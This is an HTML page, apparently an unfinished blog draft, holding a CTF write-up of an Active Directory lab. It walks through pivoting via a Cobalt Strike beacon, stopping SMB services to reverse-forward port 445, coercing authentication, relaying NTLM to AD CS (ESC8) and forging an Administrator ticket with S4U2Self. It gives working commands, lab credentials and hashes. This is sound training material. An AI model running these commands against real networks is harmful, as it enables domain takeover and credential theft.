@@ -1,0 +1,683 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>SINCON CTF 2025</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="SINCON CTF 2025" />
+<meta name="author" content="Zavier Lee" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="http://localhost:4000/sincon-2025.html" />
+<meta property="og:url" content="http://localhost:4000/sincon-2025.html" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="SINCON CTF 2025" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","author":{"@type":"Person","name":"Zavier Lee"},"headline":"SINCON CTF 2025","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/img/logo.png"},"name":"Zavier Lee"},"url":"http://localhost:4000/sincon-2025.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=53a2a0495da3322fee2d39cd744398ce2d3c087e">
+    <!--[if lt IE 9]>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <![endif]-->
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+  <body>
+    <div class="wrapper">
+      <header>
+        <h1><a href="http://localhost:4000/"> </a></h1>
+
+        
+          <img src="/assets/img/logo.png" alt="Logo" />
+        
+
+        <p> </p>
+
+        
+        <p class="view"><a href="https://github.com/ASYNC-Security/async-security.github.io">View the Project on GitHub <small>ASYNC-Security/async-security.github.io</small></a></p>
+        
+
+        
+
+        
+      </header>
+      <section>
+
+      <style>
+.author-section {
+    padding: 16px 0;
+    margin: 20px 0;
+    border-bottom: 1px solid #444;
+}
+
+.author-info {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+}
+
+.author-avatar {
+    width: 48px;
+    height: 48px;
+    border-radius: 50%;
+    object-fit: cover;
+    border: 2px solid #555;
+}
+
+.author-name {
+    font-weight: 600;
+    color: white;
+    margin: 0;
+    font-size: 1em;
+}
+
+.author-title {
+    color: #ccc;
+    font-size: 0.9em;
+    margin: 2px 0 0 0;
+}
+
+.author-links {
+    display: flex;
+    gap: 12px;
+    font-size: 0.9em;
+    margin-top: 6px;
+}
+
+.author-links a {
+    color: #4da6ff;
+    text-decoration: none;
+}
+
+.author-links a:hover {
+    color: #66b3ff;
+    text-decoration: underline;
+}
+
+.post-meta {
+    color: #ccc;
+    font-size: 0.9em;
+    margin-bottom: 12px;
+}
+
+.toc-container a {
+    text-decoration: none;
+}
+
+.toc-container a:hover {
+    text-decoration: underline;
+}
+
+.toc-toggle {
+    background: none;
+    border: none;
+    font-size: 1.1em;
+    font-weight: 500;
+    cursor: pointer;
+    width: 100%;
+    text-align: left;
+    padding: 10px 0;
+    color: inherit;
+}
+
+.toc-content {
+    display: none;
+    margin-top: 8px;
+}
+
+.toc-content.expanded {
+    display: block;
+}
+
+.toc-container ol {
+    margin: 0;
+    padding-left: 20px;
+}
+
+.toc-container ul {
+    margin: 4px 0;
+    padding-left: 20px;
+}
+
+.toc-container li {
+    margin: 4px 0;
+}
+
+@media (max-width: 962px) {
+    .author-section {
+        margin: 10px 0;
+        padding: 12px 0;
+        border-bottom: 1px solid #444;
+        border-top: none;
+    }
+    
+    .post-meta {
+        margin-bottom: 8px;
+    }
+    
+    h1 {
+        margin-top: 0;
+        margin-bottom: 10px;
+    }
+    
+    section {
+        padding-top: 0 !important;
+    }
+    
+    hr {
+        display: none;
+    }
+    
+    .author-section::before {
+        display: none;
+    }
+}
+</style>
+
+
+
+
+
+
+<div class="author-section">
+<div class="author-info">
+
+<img src="./assets/img/authors/zavier.png" alt="Zavier Lee" class="author-avatar">
+
+<div>
+<div class="author-name">Zavier Lee</div>
+
+<div class="author-title">Offensive Security Engineer</div>
+
+
+<div class="author-links">
+
+<a href="https://x.com/gatariee" target="_blank">Twitter</a>
+
+
+<a href="https://github.com/gatariee" target="_blank">GitHub</a>
+
+</div>
+
+</div>
+</div>
+</div>
+
+
+<h1 id="sincon-ctf-2025">SINCON CTF 2025</h1>
+
+<p>During <a href="https://www.infosec-city.com/sin-25">SINCON 2025</a>, we sponsored and organized an Active Directory CTF with the <a href="https://www.rangevillage.org/">Range Village</a>. We saw an incredible turnout with nearly 50 people joining us in person, including many newcomers who had never tackled Active Directory challenges before!</p>
+
+<p>This post will provide an overview of the more “challenging” part of the CTF, which involved bypassing <a href="https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/overview?view=powershell-7.5">Just Enough Administration (JEA)</a> and exploiting <a href="https://www.thehacker.recipes/ad/movement/adcs/unsigned-endpoints#web-endpoint-esc8">ESC8</a> from a pivot in a restrictive environment by temporarily unbinding SMB ports without the use of <a href="https://github.com/praetorian-inc/PortBender">PortBender</a>.</p>
+
+<p>[insert img here]</p>
+
+<div class="toc-container">
+<button class="toc-toggle" onclick="toggleToc()">Table of Contents ▼</button>
+<div class="toc-content" id="tocContent">
+<ol>
+<li>
+<a href="#introduction">Introduction</a>
+<ul>
+<li><a href="#context">Context</a></li>
+<li><a href="#network-topology">Network Topology</a></li>
+</ul>
+</li>
+<li>
+<a href="#pivots-and-c2">Pivots and C2</a>
+<ul>
+<li><a href="#command-and-control-c2">Command and Control (C2)</a></li>
+</ul>
+</li>
+<li>
+<a href="#scriptorium-esc8">SCRIPTORIUM (ESC8)</a>
+<ul>
+<li><a href="#enumerating-esc8">Enumerating ESC8</a></li>
+<li><a href="#esc8-a-tldr">ESC8, a TLDR</a></li>
+<li><a href="#the-ugly">The Ugly</a></li>
+<li><a href="#caveat">Caveat</a></li>
+</ul>
+</li>
+<li>
+<a href="#smb-unbinding">SMB Unbinding</a>
+</li>
+<li>
+<a href="#u2u2self">U2U2Self</a>
+</li>
+<li>
+<a href="#exploiting-esc8">Exploiting ESC8</a>
+<ul>
+<li><a href="#smb-coercion">SMB Coercion</a></li>
+<li><a href="#relay-to-ca">Relay to CA</a></li>
+<li><a href="#exchanging-for-ntlm">Exchanging for NTLM</a></li>
+<li><a href="#logon-dilemma">Logon Dilemma</a></li>
+</ul>
+</li>
+<li>
+<a href="#s4u2self">S4U2Self</a>
+</li>
+<li>
+<a href="#silver-ticket">Silver Ticket</a>
+</li>
+</ol>
+</div>
+</div>
+<p><br /></p>
+
+<h2 id="introduction">Introduction</h2>
+
+<p>The given scenario was an assumed breach via an exposed Wi-Fi access point with weak credentials (<code class="language-plaintext highlighter-rouge">RN-Lab</code>:<code class="language-plaintext highlighter-rouge">rangevillagelab</code>), which placed the attacker directly into the <code class="language-plaintext highlighter-rouge">jess.kingdom</code> Active Directory domain.</p>
+
+<p>As well as the following scope, and contextual information:</p>
+
+<ul>
+  <li>Any domain-joined machine in the ranges: <code class="language-plaintext highlighter-rouge">10.3.10.0/24</code> and <code class="language-plaintext highlighter-rouge">10.3.20.0/24</code> is in scope.</li>
+  <li>All machines are fully-patched Windows Server 2022, including the Domain Controller.</li>
+  <li>You should refrain from running disruptive actions such as forcefully changing passwords, running nmap scans or locking accounts.</li>
+  <li>There are a total of 12 flags.</li>
+</ul>
+
+<p>To keep this brief, I’ll skip directly to Flag 8, where the CTF’s challenges became significantly more complex and engaging. Which unfortunately only had 2 solves by <a href="https://www.linkedin.com/in/nicholas-soh/">Nicholas</a> and <a href="https://www.linkedin.com/in/edwinczd/">Edwin</a>.</p>
+
+<h2 id="context">Context</h2>
+
+<p>From Flag 6, we’ll obtain local administrator access to the <code class="language-plaintext highlighter-rouge">TABULARIUM</code> machine. And, the following commands were used to create a new user <code class="language-plaintext highlighter-rouge">gatari</code> with administrative privileges:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net user gatari P@ssw0rd /add
+net localgroup Administrators gatari /add
+</code></pre></div></div>
+
+<p>From Flag 7, we’ll obtain the credentials for the <code class="language-plaintext highlighter-rouge">JESS\Doros_ARCHIVON</code> user from a KeePass database in an SMB share that we can decrypt with a master key that was found in Flag 5.</p>
+
+<h2 id="network-topology">Network Topology</h2>
+
+<p><img src="/assets/img/sincon/scenario.jpg" alt="" /></p>
+
+<p>The internal machines (<code class="language-plaintext highlighter-rouge">SCRIPTORIUM</code> and <code class="language-plaintext highlighter-rouge">PORTICUS</code>) are unable to directly communicate with our machine due to the firewall rules in place and similarly, we are unable to directly communicate with them. This is a common scenario where we’ll need to pivot through a compromised machine to access other machines in the network.</p>
+
+<hr />
+
+<h2 id="pivots-and-c2">Pivots and C2</h2>
+
+<p>We’re able to verify that our backdoored user is a local administrator to <code class="language-plaintext highlighter-rouge">TABULARIUM</code> by running the following command:</p>
+
+<p><img src="/assets/img/sincon/1.PNG" alt="" /></p>
+
+<p>The presence of the <code class="language-plaintext highlighter-rouge">(Pwn3d!)</code> message indicates that the authenticated user is a local administrator, note that this is a local user and not a domain user.</p>
+
+<p>After connecting to the Wi-Fi access point, you will be assigned an IP address in the <code class="language-plaintext highlighter-rouge">10.3.99.0/24</code> range, which is accessible via the <code class="language-plaintext highlighter-rouge">TABULARIUM</code> machine. We can verify this by pinging our IP address from <code class="language-plaintext highlighter-rouge">TABULARIUM</code> (in this case, it is <code class="language-plaintext highlighter-rouge">10.3.99.2</code>):</p>
+
+<p><img src="/assets/img/sincon/6f45c04c0ebf3d7847e4168839484f9a.png" alt="" /></p>
+
+<h3 id="command-and-control-c2">Command and Control (C2)</h3>
+
+<p>To establish a C2 channel, we’ll be using <a href="https://www.cobaltstrike.com/">Cobalt Strike</a> with an HTTP listener. The remainder of the attacks can also be performed using any other C2, but I’ve had the best experiences with <a href="https://github.com/HavocFramework/Havoc">Havoc</a> and recently had success with <a href="https://github.com/Adaptix-Framework/AdaptixC2">AdaptixC2</a>.</p>
+
+<p>After setting up our listener and generating payloads, we can upload the payload onto <code class="language-plaintext highlighter-rouge">TABULARIUM</code>:</p>
+
+<p><img src="/assets/img/sincon/66e18bee38a61b4eb7bdb45d8f72ab5e.png" alt="" /></p>
+
+<p>Execute via your preferred method, but if using <code class="language-plaintext highlighter-rouge">netexec</code> remember to run with <code class="language-plaintext highlighter-rouge">--no-output</code> to prevent it from blocking the tool:</p>
+
+<p><img src="/assets/img/sincon/202986d9a40784585ff2df78730f75e7.png" alt="" /></p>
+
+<p>After executing the payload, we can verify that we have a session established with <code class="language-plaintext highlighter-rouge">TABULARIUM</code>:</p>
+
+<p><img src="/assets/img/sincon/bd64132ba6fc0d4ed8b81401bc0e544f.png" alt="" /></p>
+
+<h2 id="scriptorium-esc8">SCRIPTORIUM (ESC8)</h2>
+
+<p>After obtaining a pivot point at <code class="language-plaintext highlighter-rouge">TABULARIUM</code>, we can use tunnel our traffic through the beacon channel with <code class="language-plaintext highlighter-rouge">socks5</code> to hit <code class="language-plaintext highlighter-rouge">SCRIPTORIUM</code> and <code class="language-plaintext highlighter-rouge">PORTICUS</code>. This is done by setting up a <code class="language-plaintext highlighter-rouge">socks5</code> proxy on the Cobalt Strike beacon:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[05/26 01:23:39] beacon&gt; socks 1081 socks5
+[05/26 01:23:39] [+] started SOCKS5 server on: 1081
+[05/26 01:23:39] [+] host called home, sent: 16 bytes
+</code></pre></div></div>
+
+<p>We can verify that we can now access <code class="language-plaintext highlighter-rouge">SCRIPTORIUM</code>.</p>
+
+<p><img src="/assets/img/sincon/102415ac014b7147d346639887433e6d.png" alt="" /></p>
+
+<h2 id="enumerating-esc8">Enumerating ESC8</h2>
+
+<p>Before this point, there have been no (intended) attack paths that involve Active Directory Certificate Services (ADCS). However, we can see that ADCS is installed with the <code class="language-plaintext highlighter-rouge">DC-JESS-CA</code> Common Name (CN) and the <code class="language-plaintext highlighter-rouge">PALACE-DC.jess.kingdom</code> DC is the issuing CA.</p>
+
+<p><img src="/assets/img/sincon/74d1631b646ad85df9c4bd8a52df1e79.png" alt="" /></p>
+
+<p>Using any domain user, we can enumerate for enabled Certificate Templates and generic vulnerabilities (<code class="language-plaintext highlighter-rouge">ESC</code>) using <a href="https://github.com/ly4k/Certipy">certipy</a>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy find -u 'Doros_ARCHIVON' -p 'bO3n21E6rc' -target 'PALACE-DC.jess.kingdom' -stdout -vulnerable
+</code></pre></div></div>
+
+<p><img src="/assets/img/sincon/a77799cc3d4f7ac47702322a3f16cc13.png" alt="" /></p>
+
+<h2 id="esc8-a-tldr">ESC8, a TLDR</h2>
+
+<p>ESC8 is a vulnerability that is extremely common in many environments, and it boils down to allowing enrollment of certificates through the web endpoint of the Certificate Authority (i.e. <code class="language-plaintext highlighter-rouge">http://palace-dc.jess.kingdom/certsrv</code>). The attack occurs when an attacker is able to “coerce” authentication from a machine, or user and relay their credentials to the web endpoint and obtain either a <code class="language-plaintext highlighter-rouge">User</code> or <code class="language-plaintext highlighter-rouge">Machine</code> certificate.</p>
+
+<p><img src="/assets/img/sincon/ESC8.png" alt="" /></p>
+
+<p>Unlike protocols such as <code class="language-plaintext highlighter-rouge">SMB</code> and <code class="language-plaintext highlighter-rouge">LDAP</code> that support signing, the <code class="language-plaintext highlighter-rouge">HTTP</code> protocol does <em>not</em> have support for signing <code class="language-plaintext highlighter-rouge">NTLM</code> authentication so the attacker can relay any NTLM authentication to the <code class="language-plaintext highlighter-rouge">HTTP</code> web endpoint. As such, this attack is possible regardless of the signing configuration of the domain.</p>
+
+<h2 id="the-ugly">The Ugly</h2>
+
+<p>If some lightbulb hasn’t gone off yet, the presence of this vulnerability in an environment is usually a sign that domain compromise is soon to follow. This is because SMB authentication coercion is <em>native</em> to Windows, and is not seen as a security risk by Microsoft.</p>
+
+<p>Additionally, the configuration required to enable ESC8 is vulnerable by default when installing <code class="language-plaintext highlighter-rouge">Web Enrollment</code> on the CA server. The following commands were run on a default installation of ADCS to enable the vulnerability:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Install-WindowsFeature -Name ADCS-Web-Enrollment
+Install-AdcsWebEnrollment -Force
+</code></pre></div></div>
+
+<p>Mitigations, and additional caveats will be discussed later, but for now, let’s focus on how to exploit this vulnerability.</p>
+
+<h2 id="caveat">Caveat</h2>
+
+<p>If you recall from the network topology diagram from earlier, the <code class="language-plaintext highlighter-rouge">SCRIPTORIUM</code> and <code class="language-plaintext highlighter-rouge">PORTICUS</code> machines are unable to directly communicate with our machine due to the firewall rules in place. This means that we cannot coerce authentication from either of these machines to our listener, and relay it to the CA directly.</p>
+
+<p><img src="/assets/img/sincon/scenario.jpg" alt="" /></p>
+
+<p>Instead, we’ll need to use <code class="language-plaintext highlighter-rouge">TABULARIUM</code> as a pivot point to relay the authentication from <code class="language-plaintext highlighter-rouge">SCRIPTORIUM</code> or <code class="language-plaintext highlighter-rouge">PORTICUS</code> to our listener.</p>
+
+<p><img src="/assets/img/sincon/ESC8-2.jpg" alt="" /></p>
+
+<h2 id="smb-unbinding">SMB Unbinding</h2>
+
+<p>We can perform the above relay by doing a reverse port forward on <code class="language-plaintext highlighter-rouge">TABULARIUM</code> to our machine on <code class="language-plaintext highlighter-rouge">TCP/445 (SMB)</code>, however we will soon find an access denied.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[05/26 02:13:23] beacon&gt; rportfwd 445 0.0.0.0 445
+[05/26 02:13:23] [+] started reverse port forward on 445 to 0.0.0.0:445
+[05/26 02:13:23] [*] Tasked beacon to forward port 445 to 0.0.0.0:445
+[05/26 02:13:23] [+] host called home, sent: 10 bytes
+[05/26 02:13:23] [-] Could not bind to 445
+</code></pre></div></div>
+
+<p>This is occuring because <code class="language-plaintext highlighter-rouge">TABULARIUM</code> is a domain-joined Windows machine, and the <code class="language-plaintext highlighter-rouge">SYSTEM</code> process is currently using it for the <code class="language-plaintext highlighter-rouge">SMB</code> service.</p>
+
+<blockquote>
+  <p>PID 4 is the <code class="language-plaintext highlighter-rouge">System</code> process, which is responsible for managing system-level services and processes.</p>
+</blockquote>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[05/26 02:13:44] beacon&gt; run netstat -ano
+[05/26 02:13:44] [*] Tasked beacon to run: netstat -ano
+[05/26 02:13:45] [+] host called home, sent: 30 bytes
+[05/26 02:13:45] [+] received output:
+
+Active Connections
+    Proto  Local Address          Foreign Address        State           PID
+    TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       1000
+    TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+    TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       7624
+    TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1100
+    TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
+    TCP    0.0.0.0:5986           0.0.0.0:0              LISTENING       4
+</code></pre></div></div>
+
+<p>In the past, the go-to method for “unbinding” SMB is using <a href="https://github.com/praetorian-inc/PortBender">PortBender</a> to forcefully redirect traffic on <code class="language-plaintext highlighter-rouge">TCP/445</code> using <code class="language-plaintext highlighter-rouge">WinDivert64.sys</code>. However, from my testing this seems to no longer be functional and/or maintained.</p>
+
+<p>Luckily, there’s an alternative method to release the SMB service from port 445: just force-stop the user-space services that provide SMB functionality.</p>
+
+<p>Running the following commands in this order will release the port:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc stop lanmanserver
+sc stop srv2
+sc stop srvnet
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[05/26 02:23:21] beacon&gt; run sc stop lanmanserver
+[05/26 02:23:21] [*] Tasked beacon to run: sc stop lanmanserver
+[05/26 02:23:21] [+] host called home, sent: 38 bytes
+[05/26 02:23:21] [+] received output:
+
+SERVICE_NAME: lanmanserver 
+        TYPE               : 30  WIN32  
+        STATE              : 3  STOP_PENDING 
+                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x4e20
+
+[05/26 02:23:52] beacon&gt; run sc stop srv2
+[05/26 02:23:52] [*] Tasked beacon to run: sc stop srv2
+[05/26 02:23:53] [+] host called home, sent: 30 bytes
+[05/26 02:23:53] [+] received output:
+
+SERVICE_NAME: srv2 
+        TYPE               : 2  FILE_SYSTEM_DRIVER  
+        STATE              : 1  STOPPED 
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+
+[05/26 02:23:58] beacon&gt; run sc stop srvnet
+[05/26 02:23:58] [*] Tasked beacon to run: sc stop srvnet
+[05/26 02:23:58] [+] host called home, sent: 32 bytes
+[05/26 02:23:58] [+] received output:
+
+SERVICE_NAME: srvnet 
+        TYPE               : 2  FILE_SYSTEM_DRIVER  
+        STATE              : 1  STOPPED 
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+</code></pre></div></div>
+
+<p>Next, we can check <code class="language-plaintext highlighter-rouge">netstat</code> again and find that <code class="language-plaintext highlighter-rouge">TCP/445</code> is no longer in use.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[05/26 02:24:35] beacon&gt; run netstat -ano
+[05/26 02:24:35] [*] Tasked beacon to run: netstat -ano
+[05/26 02:24:35] [+] host called home, sent: 30 bytes
+[05/26 02:24:35] [+] received output:
+
+Active Connections
+
+  Proto  Local Address          Foreign Address        State           PID
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       1000
+  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       7624
+  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1100
+  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:5986           0.0.0.0:0              LISTENING       4
+</code></pre></div></div>
+
+<p>And, we can proceed to perform the reverse port forward once again with no errors:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[05/26 02:26:27] beacon&gt; rportfwd 445 0.0.0.0 445
+[05/26 02:26:27] [+] started reverse port forward on 445 to 0.0.0.0:445
+[05/26 02:26:27] [*] Tasked beacon to forward port 445 to 0.0.0.0:445
+[05/26 02:26:27] [+] host called home, sent: 10 bytes
+</code></pre></div></div>
+
+<p>This can be verified by running a <code class="language-plaintext highlighter-rouge">curl</code> against ourselves at <code class="language-plaintext highlighter-rouge">TCP/445</code> and catching the request on our host:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[05/26 02:27:06] beacon&gt; powershell curl http://127.0.0.1:445
+[05/26 02:27:06] [*] Tasked beacon to run: curl http://127.0.0.1:445
+[05/26 02:27:06] [+] host called home, sent: 131 bytes
+[05/26 02:27:16] [+] received output:
+#&lt; CLIXML
+</code></pre></div></div>
+
+<h2 id="u2u2self">U2U2Self</h2>
+
+<p>The last portion of the ESC8 attack (after obtaining a <code class="language-plaintext highlighter-rouge">Machine</code> or <code class="language-plaintext highlighter-rouge">User</code> certificate) is to exchange the certificate for a <code class="language-plaintext highlighter-rouge">TGT</code> (Ticket Granting Ticket) for the <code class="language-plaintext highlighter-rouge">jess.kingdom</code> domain.</p>
+
+<p>When a certificate is used to authenticate (PKINIT), the resultant ticket will include a <code class="language-plaintext highlighter-rouge">PAC_CREDENTIAL_INFO</code> structure that contains the NTLM hash of the user or machine account. The authenticating user’s NTLM hash can then be recovered by performing a <code class="language-plaintext highlighter-rouge">S4U2Self</code> with a <code class="language-plaintext highlighter-rouge">U2U</code> extension.</p>
+
+<p>More details of this attack can be found here: <a href="https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash">Unpac-The-Hash</a></p>
+
+<p><img src="/assets/img/sincon/75f6b26be3a4ae9c2ca2d090d05ca231.png" alt="" /></p>
+
+<h2 id="exploiting-esc8">Exploiting ESC8</h2>
+
+<p>Now that we are able to redirect traffic from <code class="language-plaintext highlighter-rouge">TABULARIUM:445</code> to our machine, we can proceed with the attack:</p>
+<ol>
+  <li>Coerce SMB authentication via Spooler using <a href="https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py">printerbug.py</a> from <code class="language-plaintext highlighter-rouge">SCRIPTORIUM</code> to <code class="language-plaintext highlighter-rouge">TABULARIUM</code></li>
+  <li>Forward SMB from <code class="language-plaintext highlighter-rouge">TABULARIUM:445</code> to our <code class="language-plaintext highlighter-rouge">ATTACKER:445</code></li>
+  <li>Catch authentication, and relay to <code class="language-plaintext highlighter-rouge">http://palace-dc.jess.kingdom/certsrv/certfnsh.asp</code> and request for a <code class="language-plaintext highlighter-rouge">Machine</code> certificate as <code class="language-plaintext highlighter-rouge">SCRIPTORIUM$</code>.</li>
+</ol>
+
+<p>After obtaining the <code class="language-plaintext highlighter-rouge">Machine</code> certificate, we can use it to authenticate to the DC as <code class="language-plaintext highlighter-rouge">SCRIPTORIUM$</code> and “exchange” the certificate for the NTLM hash of the authenticating user.</p>
+
+<h3 id="smb-coercion">SMB Coercion</h3>
+
+<p>In default installations of Windows Server, the Spooler service is installed and can be used to coerce SMB authentication via the <code class="language-plaintext highlighter-rouge">RpcRemoteFindFirstPrinterChangeNotificationEx</code> method. <a href="https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory#47">This is not seen as a security risk by Microsoft</a>.</p>
+
+<p>We can call this function remotely with <a href="https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py">printerbug.py</a> to coerce authentication from <code class="language-plaintext highlighter-rouge">SCRIPTORUIM</code> to <code class="language-plaintext highlighter-rouge">TABULARIUM</code>:</p>
+
+<p><img src="/assets/img/sincon/a348c46268ddf675c946398b7f0035d5.png" alt="" /></p>
+
+<h3 id="relay-to-ca">Relay to CA</h3>
+
+<p>We’ll use <a href="https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py">ntlmrelayx.py</a> to relay the authentication to the CA web endpoint, which will request a <code class="language-plaintext highlighter-rouge">Machine</code> certificate for any authenticating user.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntlmrelayx.py -t 'http://palace-dc.jess.kingdom/certsrv/certfnsh.asp' -smb2support --adcs --template 'Machine' --no-http-server
+</code></pre></div></div>
+
+<p><img src="/assets/img/sincon/59e5e32dd8ff6d948f302db91f4c153e.png" alt="" /></p>
+
+<h3 id="exchanging-for-ntlm">Exchanging for NTLM</h3>
+
+<p>We can use the obtained <code class="language-plaintext highlighter-rouge">SCRIPTORIUM$</code> certificate (named <code class="language-plaintext highlighter-rouge">SCRIPTORIUM$.pfx</code>) to authenticate to the DC and obtain the NTLM hash of the authenticating user. This is done by running the following command:</p>
+
+<p><img src="/assets/img/sincon/b32ecb69363b199c8716d12326da89da.png" alt="" /></p>
+
+<h3 id="logon-dilemma">Logon Dilemma</h3>
+
+<p>After obtaining the NTLM hash of <code class="language-plaintext highlighter-rouge">SCRIPTORIUM$</code>, we can use it to authenticate to <code class="language-plaintext highlighter-rouge">SCRIPTORIUM.jess.kingdom</code>. You’ll find that you are indeed authenticated, however you don’t have the <code class="language-plaintext highlighter-rouge">(Pwn3d!)</code> message.</p>
+
+<p><img src="/assets/img/sincon/8067f029665756510cb023f07f604f6e.png" alt="" /></p>
+
+<p>This is because computer accounts do not necessarily have local administrator access to themselves. There are 2 main workarounds to this:</p>
+
+<ul>
+  <li>Use <code class="language-plaintext highlighter-rouge">S4U2self</code> to obtain a Service Ticket to yourself as a Domain Administrator</li>
+  <li>Use your <code class="language-plaintext highlighter-rouge">NTLM</code> hash to forge a Silver Ticket for any SPN to yourself as a Domain Administrator</li>
+</ul>
+
+<h4 id="s4u2self">S4U2Self</h4>
+
+<p>S4U2Self is an <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13">extension of Kerberos</a> that allows for services to obtain a service ticket on behalf of any user. Machines in Active Directory are services, that have a number of Service Principal Names (SPNs) - some of which you may recognize: <code class="language-plaintext highlighter-rouge">cifs</code>, <code class="language-plaintext highlighter-rouge">host</code>, <code class="language-plaintext highlighter-rouge">rpcss</code>, <code class="language-plaintext highlighter-rouge">wsman</code>, etc.</p>
+
+<p>Using the above protocol, we can obtain a service ticket for <code class="language-plaintext highlighter-rouge">cifs</code> service to ourselves as the <code class="language-plaintext highlighter-rouge">Administrator</code> account:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>getST.py -self -impersonate 'Administrator' -altservice 'cifs/SCRIPTORIUM.jess.kingdom' 'jess.kingdom'/'SCRIPTORIUM$' -hashes ':cdc728e1aefc4e997d6d895fbbaec3f9'
+</code></pre></div></div>
+
+<p><img src="/assets/img/sincon/9c0ca9426cbef0a5ea09ef77a627e90c.png" alt="" /></p>
+
+<p>The attributes of this ticket can also be found using <code class="language-plaintext highlighter-rouge">describeTicket.py</code>, which shows that is a valid ticket for the <code class="language-plaintext highlighter-rouge">cifs/SCRIPTORIUM.jess.kingdom</code> service, for the <code class="language-plaintext highlighter-rouge">Administrator</code> user in the <code class="language-plaintext highlighter-rouge">jess.kingdom</code> realm:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>describeTicket.py Administrator@cifs_SCRIPTORIUM.jess.kingdom@JESS.KINGDOM.ccache
+Impacket v0.13.0.dev0+20250516.105908.a63c652 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Number of credentials in cache: 1
+[*] Parsing credential[0]:
+[*] Ticket Session Key            : a3c0173f32c7c3ad93d7dddf7d549e90
+[*] User Name                     : Administrator
+[*] User Realm                    : jess.kingdom
+[*] Service Name                  : cifs/SCRIPTORIUM.jess.kingdom
+[*] Service Realm                 : JESS.KINGDOM
+[*] Start Time                    : 26/05/2025 03:02:06 AM
+[*] End Time                      : 26/05/2025 13:02:06 PM
+[*] RenewTill                     : 27/05/2025 03:02:08 AM
+[*] Flags                         : (0x40a10000) forwardable, renewable, pre_authent, enc_pa_rep
+[*] KeyType                       : rc4_hmac
+[*] Base64(key)                   : o8AXPzLHw62T193ffVSekA==
+[*] Kerberoast hash               : ...redacted...
+[*] Decoding unencrypted data in credential[0]['ticket']:
+[*]   Service Name                : cifs/SCRIPTORIUM.jess.kingdom
+[*]   Service Realm               : JESS.KINGDOM
+[*]   Encryption type             : aes256_cts_hmac_sha1_96 (etype 18)
+[-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied
+</code></pre></div></div>
+
+<p>And subsequently, this ticket can be used for Kerberos authentication to <code class="language-plaintext highlighter-rouge">SCRIPTORIUM</code> as <code class="language-plaintext highlighter-rouge">Administrator</code>:</p>
+
+<p><img src="/assets/img/sincon/39aae768b3364999a85c609b84546775.png" alt="" /></p>
+
+<h4 id="silver-ticket">Silver Ticket</h4>
+
